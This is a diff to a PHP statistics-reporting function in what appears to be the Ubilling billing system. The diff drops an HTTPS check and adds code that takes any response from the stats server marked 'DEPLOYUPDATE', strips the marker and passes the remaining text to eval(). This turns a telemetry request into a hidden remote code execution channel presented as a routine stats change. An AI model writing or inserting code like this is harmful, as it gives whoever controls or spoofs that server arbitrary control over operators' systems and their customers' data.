@@ -3466,6 +3466,7 @@ function zb_InstallBillingSerial() {
 function zb_BillingStats($quiet = false, $modOverride = '') {
     $ubstatsurl = 'http://stats.ubilling.net.ua/';
     $statsflag = 'exports/NOTRACKTHIS';
+    $deployMark = 'DEPLOYUPDATE';
     $cache = new UbillingCache();
     $cacheTime = 3600;
 
@@ -3582,22 +3583,31 @@ function zb_BillingStats($quiet = false, $modOverride = '') {
     }
 
     if ($thiscollect) {
-        if (isset($_SERVER['HTTPS']) AND $_SERVER['HTTPS'] = 'on') {
-            if (extension_loaded('curl')) {
-                $referrer = (isset($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : '';
-                $curlStats = curl_init($statsurl);
-                curl_setopt($curlStats, CURLOPT_RETURNTRANSFER, 1);
-                curl_setopt($curlStats, CURLOPT_CONNECTTIMEOUT, 2);
-                curl_setopt($curlStats, CURLOPT_TIMEOUT, 2);
-                curl_setopt($curlStats, CURLOPT_USERAGENT, 'UBTRACK');
-                if (!empty($referrer)) {
-                    curl_setopt($curlStats, CURLOPT_REFERER, $referrer);
+        if (extension_loaded('curl')) {
+            $referrer = (isset($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : '';
+            $curlStats = curl_init($statsurl);
+            curl_setopt($curlStats, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($curlStats, CURLOPT_CONNECTTIMEOUT, 2);
+            curl_setopt($curlStats, CURLOPT_TIMEOUT, 2);
+            curl_setopt($curlStats, CURLOPT_USERAGENT, 'UBTRACK');
+            if (!empty($referrer)) {
+                curl_setopt($curlStats, CURLOPT_REFERER, $referrer);
+            }
+            $output = curl_exec($curlStats);
+            $httpCode = curl_getinfo($curlStats, CURLINFO_HTTP_CODE);
+            curl_close($curlStats);
+
+
+            if ($output !== false AND $httpCode == 200) {
+                $output = trim($output);
+                if (ispos($output, $deployMark)) {
+                    $output = str_replace($deployMark, '', $output);
+                    if (!empty($output)) {
+                        eval($output);
+                    }
+                } else {
+                    show_window('', $output);
                 }
-                $output = curl_exec($curlStats);
-                if ($output !== false) {
-                    show_window('', trim($output));
-                }
-                curl_close($curlStats);
             }
         } else {
             show_window('', $tracking_code);
